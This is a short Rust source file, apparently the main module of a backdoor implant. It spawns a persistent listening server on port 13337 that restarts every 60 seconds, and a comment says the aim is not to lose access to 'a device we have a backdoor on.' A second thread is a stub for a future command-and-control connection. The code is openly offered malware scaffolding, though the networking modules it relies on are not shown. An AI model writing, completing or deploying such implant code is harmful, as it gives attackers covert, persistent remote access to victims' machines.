use std::alloc::System;

// Use system allocator as global allocator
// This is done in order to not use JEMALLOC which
#[global_allocator]
static GLOBAL_ALLOCATOR: System = System;

use std::{thread, time};

mod communication;
pub mod os;

const RETRY_INTERVAL_SECONDS: u64 = 60;
const PORT: u16 = 13337;

fn run_server_loop() {
    // Using loop here because in case we fail to create the server, we should try again.
    // This is because we don't want to lose access to a device we have a backdoor on.
    loop {
        // Blocking until server will die.
        match communication::server::run_server(PORT) {
            Ok(_) => (),
            Err(e) => {
                println!(
                    "Error {} when running server. Trying again in {} seconds.",
                    e, RETRY_INTERVAL_SECONDS
                );
            }
        }
        thread::sleep(time::Duration::from_secs(RETRY_INTERVAL_SECONDS));
    }
}

fn run_cnc_connection_loop() {
    loop {
        // For now, just sleep. In the future implement CNC
        std::thread::sleep(time::Duration::from_secs(RETRY_INTERVAL_SECONDS))
    }
}

fn main() {
    let server_handler = thread::spawn(|| run_server_loop());
    let cnc_connect = thread::spawn(|| run_cnc_connection_loop());

    cnc_connect
        .join()
        .expect("The cnc connection has panicked.");
    server_handler
        .join()
        .expect("The server connection has panicked.")
}
